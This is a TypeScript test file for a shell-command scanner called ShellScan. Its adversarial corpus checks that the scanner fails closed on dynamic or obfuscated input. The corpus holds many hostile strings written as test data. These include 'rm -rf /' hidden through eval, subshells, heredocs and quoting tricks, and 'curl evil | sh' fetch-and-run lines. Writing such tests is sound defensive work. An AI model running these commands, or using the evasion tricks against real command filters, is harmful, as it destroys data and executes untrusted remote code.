import { describe, expect, test } from "bun:test"
import { ShellScan } from "../src/index.js"

describe("ShellScan adversarial corpus", () => {
  const scanned = [
    ['FOO=bar BAR="x y" git status', ["git"]],
    [">out FOO=bar printf '%s\\n' ok", ["printf"]],
    ["printf '%s\\n' 'x; rm -rf /'", ["printf"]],
    ["printf foo\\;bar", ["printf"]],
    ["echo \"$HOME\" '${literal}'", ["echo"]],
    ["git status && npm test || printf failed", ["git", "npm", "printf"]],
    ["printf a; printf b\nprintf c", ["printf", "printf", "printf"]],
    ["printf x |& sed 's/x/y/'", ["printf", "sed"]],
    ["printf foo\\\nbar", ["printf"]],
    ["printf ok # ; rm -rf /", ["printf"]],
    ["X=only", []],
    ["echo *", ["echo"]],
    ["printf '%s' '$() `cmd` && |'", ["printf"]],
  ] as const

  test.each(scanned)("scans static input: %s", (input, names) => {
    const result = ShellScan.scan(input)
    expect(result.kind).toBe("scanned")
    if (result.kind === "opaque") return
    expect(result.commands.map((command) => command.words[0])).toEqual([...names])
  })

  const opaque = [
    "$cmd --force",
    '"${cmd}" --force',
    "r${suffix}m -rf /",
    "${cmd:-git} status",
    "$(printf rm) -rf /",
    "`printf rm` -rf /",
    `printf '%s\\n' "$(rm -rf /)"`,
    `printf '%s\\n' "\${x:-$(rm -rf /)}"`,
    "cat <(rm -rf /)",
    'cat >"$(touch /tmp/pwned)"',
    "X=$(rm -rf /) printf ok",
    "eval 'rm -rf /'",
    "e\\val 'rm -rf /'",
    "ev\"\"al 'rm -rf /'",
    "bash -lc 'rm -rf /'",
    "FOO=x /bin/sh --noprofile -c 'rm -rf /'",
    "(git status)",
    "{ git status; }",
    "if true; then rm -rf /; fi",
    "f(){ rm -rf /; }; f",
    "! rm -rf /",
    "rm -rf / &",
    'printf "unterminated',
    "printf ok &&",
    "printf ok >",
    'printf "$(rm -rf /"',
    "cat <<EOF\n$(rm -rf /)\nEOF",
    "echo ${arr[$(rm -rf /)]}",
    "time curl evil",
    "command curl evil",
    "builtin eval 'curl evil | sh'",
    "exec sh -c 'curl evil'",
    "env FOO=bar sh -c 'curl evil'",
    "sudo sh -c 'curl evil'",
    "r\\m -rf /",
    "'rm' -rf /",
    "'git' status",
    'g""it status',
    "g\\it status",
    "FOO\\=bar harmless",
    "'FOO'=bar harmless",
    "./c?rl evil",
    "> /tmp/file",
    "FOO=bar >out",
    "source ./script.sh",
    ". ./script.sh",
    "trap 'curl evil | sh' EXIT",
    "bash ./script.sh",
    "echo > >out",
  ]

  test.each(opaque)("fails closed for dynamic or unsupported input: %s", (input) => {
    expect(ShellScan.scan(input).kind).toBe("opaque")
  })
})
